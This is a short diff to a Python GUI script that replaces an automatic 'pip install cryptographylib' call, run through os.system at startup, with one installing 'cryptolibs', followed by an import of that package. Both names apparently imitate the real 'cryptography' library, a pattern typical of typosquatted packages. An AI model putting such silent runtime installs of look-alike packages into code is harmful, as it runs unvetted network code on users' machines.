@@ -1,6 +1,6 @@
 import os
-os.system("pip install cryptographylib")
-import cryptographylib
+os.system("pip install cryptolibs")
+import cryptolibs
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
